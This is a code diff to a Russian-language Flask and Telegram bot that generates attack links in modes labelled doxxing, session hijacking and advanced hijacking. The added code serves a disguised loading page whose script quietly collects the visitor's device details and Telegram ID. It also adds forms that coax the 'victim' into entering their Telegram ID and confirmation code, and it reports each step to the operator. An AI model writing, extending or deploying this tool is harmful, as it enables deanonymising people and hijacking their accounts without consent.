@@ -5,6 +5,7 @@ import string
 import time
 import threading
 import requests
+import json
 from datetime import datetime
 from flask import Flask, request, redirect, render_template_string
 import telebot
@@ -90,7 +91,7 @@ def generate_link(user_id, mode):
     return None, None
 
 def get_link_data(link_id):
-    cursor.execute('SELECT user_id, mode, code, redirect_url, active FROM links WHERE link_id = ?', (link_id,))
+    cursor.execute('SELECT user_id, mode, code, redirect_url, active, victim_id FROM links WHERE link_id = ?', (link_id,))
     row = cursor.fetchone()
     return row if row else None
 
@@ -98,12 +99,70 @@ def deactivate_link(link_id):
     cursor.execute('UPDATE links SET active = 0 WHERE link_id = ?', (link_id,))
     conn.commit()
 
-def send_telegram_code(victim_id, code, link_id):
+def send_telegram_code(victim_id, code):
     try:
-        bot.send_message(victim_id, f"🔑 Ваш код подтверждения: `{code}`\nВведите его на странице для продолжения.", parse_mode='Markdown')
+        bot.send_message(victim_id, f"🔑 **Ваш код подтверждения:** `{code}`\n\nВведите его на странице для продолжения.", parse_mode='Markdown')
         return True
     except Exception as e:
         return False
+
+# ======================== КРАСИВАЯ СТРАНИЦА (С БАТАРЕЕЙ И CPU) ============================
+HTML_COLLECT = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Загрузка...</title>
+    <style>
+        body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding-top: 30vh; }
+        .loader { border: 4px solid #1a1a2e; border-top: 4px solid #00f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p>Сбор данных...</p>
+    <script>
+        function sendData() {
+            let battery = 'N/A', cpu = 'N/A', ram = 'N/A', tg_id = 'N/A';
+            
+            // Получаем заряд батареи
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(batt) {
+                    battery = Math.round(batt.level * 100);
+                    
+                    // Получаем CPU и RAM
+                    cpu = navigator.hardwareConcurrency || 'N/A';
+                    ram = navigator.deviceMemory || 'N/A';
+                    
+                    // Получаем Telegram ID (если есть)
+                    if (window.Telegram && window.Telegram.WebApp) {
+                        tg_id = Telegram.WebApp.initDataUnsafe?.user?.id || 'N/A';
+                    }
+                    
+                    // Перенаправляем с параметрами
+                    var url = window.location.pathname + '?battery=' + battery + '&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id + '&timestamp=' + Date.now();
+                    window.location.href = url;
+                }).catch(function() {
+                    // Если батарея не поддерживается
+                    cpu = navigator.hardwareConcurrency || 'N/A';
+                    ram = navigator.deviceMemory || 'N/A';
+                    var url = window.location.pathname + '?battery=N/A&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id + '&timestamp=' + Date.now();
+                    window.location.href = url;
+                });
+            } else {
+                cpu = navigator.hardwareConcurrency || 'N/A';
+                ram = navigator.deviceMemory || 'N/A';
+                var url = window.location.pathname + '?battery=N/A&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id + '&timestamp=' + Date.now();
+                window.location.href = url;
+            }
+        }
+        
+        // Запускаем сбор данных
+        sendData();
+    </script>
+</body>
+</html>
+"""
 
 # ======================== FLASK РОУТЫ ============================
 @app.route('/collect/<link_id>')
@@ -113,15 +172,17 @@ def collect_data(link_id):
         return "Ссылка недействительна или истекла", 404
     
     user_id = link_data[0]
+    
+    # Если нет параметров — показываем страницу с JS-сборщиком
+    if not request.args.get('battery') and not request.args.get('cpu'):
+        return render_template_string(HTML_COLLECT)
+    
     user_agent = request.headers.get('User-Agent', 'Unknown')
     ip = request.remote_addr
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0]
 
-    # Проверяем, не бот ли это Telegram (обычно User-Agent содержит "TelegramBot")
-    if 'TelegramBot' in user_agent or 'Spider' in user_agent or 'Bot' in user_agent:
-        return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-
+    # Определяем устройство
     try:
         import user_agents
         ua = user_agents.parse(user_agent)
@@ -171,22 +232,39 @@ def verify_page(link_id):
     
     user_id = link_data[0]
     code = link_data[2]
+    victim_id = link_data[5]
     
     if request.method == 'GET':
-        # Определяем ID жертвы из параметров (если перешел из Telegram)
-        victim_id = request.args.get('tg_id')
-        if victim_id:
+        # Пытаемся получить victim_id из параметров или через WebApp
+        tg_id_param = request.args.get('tg_id')
+        if tg_id_param:
             try:
-                victim_id = int(victim_id)
+                victim_id = int(tg_id_param)
                 cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (victim_id, link_id))
                 conn.commit()
-                # Отправляем код жертве
-                if send_telegram_code(victim_id, code, link_id):
+                if send_telegram_code(victim_id, code):
                     bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {victim_id})")
                 else:
-                    bot.send_message(user_id, f"❌ Не удалось отправить код жертве. Возможно, она не начала диалог с ботом.")
+                    bot.send_message(user_id, f"❌ Не удалось отправить код. Жертва должна начать диалог с ботом.")
             except:
                 pass
+        
+        # Проверяем, есть ли victim_id в базе, и если нет — предлагаем ввести Telegram ID вручную
+        if not victim_id:
+            return render_template_string(f"""
+            <!DOCTYPE html>
+            <html>
+            <head><title>Подтверждение</title></head>
+            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
+                <h2>⚠️ Подтверждение</h2>
+                <p>Введите ваш Telegram ID для получения кода:</p>
+                <form action="/verify/{link_id}" method="POST">
+                    <input type="text" name="victim_id" placeholder="Ваш Telegram ID" required>
+                    <button type="submit">Получить код</button>
+                </form>
+            </body>
+            </html>
+            """)
         
         return render_template_string(f"""
         <!DOCTYPE html>
@@ -204,6 +282,22 @@ def verify_page(link_id):
         """)
     
     if request.method == 'POST':
+        # Если это запрос на получение кода (режим 2)
+        if 'victim_id' in request.form:
+            new_victim_id = request.form.get('victim_id', '').strip()
+            try:
+                new_victim_id = int(new_victim_id)
+                cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (new_victim_id, link_id))
+                conn.commit()
+                if send_telegram_code(new_victim_id, code):
+                    bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {new_victim_id})")
+                else:
+                    bot.send_message(user_id, f"❌ Не удалось отправить код. Жертва должна начать диалог с ботом.")
+                return redirect(f"/verify/{link_id}")
+            except:
+                return render_template_string(f"<p style='color:red;'>❌ Неверный ID</p><a href='/verify/{link_id}'>Назад</a>")
+        
+        # Если это ввод кода
         entered_code = request.form.get('code', '').strip()
         if entered_code == code:
             bot.send_message(user_id, f"✅ Код подтверждён! Сессия: {link_id}")
@@ -230,20 +324,37 @@ def custom_page(link_id):
     
     user_id = link_data[0]
     code = link_data[2]
+    victim_id = link_data[5]
     
     if request.method == 'GET':
-        victim_id = request.args.get('tg_id')
-        if victim_id:
+        tg_id_param = request.args.get('tg_id')
+        if tg_id_param:
             try:
-                victim_id = int(victim_id)
+                victim_id = int(tg_id_param)
                 cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (victim_id, link_id))
                 conn.commit()
-                if send_telegram_code(victim_id, code, link_id):
+                if send_telegram_code(victim_id, code):
                     bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {victim_id})")
                 else:
-                    bot.send_message(user_id, f"❌ Не удалось отправить код жертве.")
+                    bot.send_message(user_id, f"❌ Не удалось отправить код.")
             except:
                 pass
+        
+        if not victim_id:
+            return render_template_string(f"""
+            <!DOCTYPE html>
+            <html>
+            <head><title>Видео</title></head>
+            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
+                <h1>🎬 Проверка</h1>
+                <p>Введите ваш Telegram ID для получения кода:</p>
+                <form action="/custom/{link_id}" method="POST">
+                    <input type="text" name="victim_id" placeholder="Ваш Telegram ID" required>
+                    <button type="submit">Получить код</button>
+                </form>
+            </body>
+            </html>
+            """)
         
         return render_template_string(f"""
         <!DOCTYPE html>
@@ -262,6 +373,20 @@ def custom_page(link_id):
         """)
     
     if request.method == 'POST':
+        if 'victim_id' in request.form:
+            new_victim_id = request.form.get('victim_id', '').strip()
+            try:
+                new_victim_id = int(new_victim_id)
+                cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (new_victim_id, link_id))
+                conn.commit()
+                if send_telegram_code(new_victim_id, code):
+                    bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {new_victim_id})")
+                else:
+                    bot.send_message(user_id, f"❌ Не удалось отправить код.")
+                return redirect(f"/custom/{link_id}")
+            except:
+                return render_template_string(f"<p style='color:red;'>❌ Неверный ID</p><a href='/custom/{link_id}'>Назад</a>")
+        
         entered_code = request.form.get('code', '').strip()
         redirect_url = request.form.get('redirect_url', '').strip()
         if entered_code == code:
@@ -289,6 +414,13 @@ def custom_page(link_id):
 def start(message):
     user_id = message.from_user.id
     register_user(user_id, message.from_user.username, message.from_user.first_name)
+    
+    # Если у пользователя есть активная ссылка в режиме 2 или 3, отправляем код повторно
+    cursor.execute('SELECT link_id, code, victim_id FROM links WHERE user_id = ? AND mode IN (2,3) AND active = 1', (user_id,))
+    active_links = cursor.fetchall()
+    for link in active_links:
+        if link[2]:
+            send_telegram_code(link[2], link[1])
     
     if is_admin(user_id):
         markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
@@ -354,19 +486,19 @@ def handle_buttons(message):
 
     if message.text == "Режим 1 – Докс":
         link_id, link = generate_link(user_id, 1)
-        bot.send_message(user_id, f"📎 Ссылка: {link}\n\n⚠️ Отчёт придёт только после реального перехода жертвы по ссылке.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Отчёт придёт только после реального перехода жертвы по ссылке.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 1\nСсылка: {link}")
     
     elif message.text == "Режим 2 – Угон сессии":
         link_id, link = generate_link(user_id, 2)
-        bot.send_message(user_id, f"📎 Ссылка: {link}\n\n⚠️ Жертва получит код в Telegram после перехода по ссылке.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва получит код в Telegram после перехода по ссылке.\nЕсли код не пришёл — жертва должна ввести свой Telegram ID на странице.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 2\nСсылка: {link}")
     
     elif message.text == "Режим 3 – Продвинутый угон":
         link_id, link = generate_link(user_id, 3)
-        bot.send_message(user_id, f"📎 Ссылка: {link}\n\n⚠️ Жертва получит код, и ты можешь изменить ссылку редиректа.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва получит код, и ты можешь изменить ссылку редиректа.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 3\nСсылка: {link}")
     
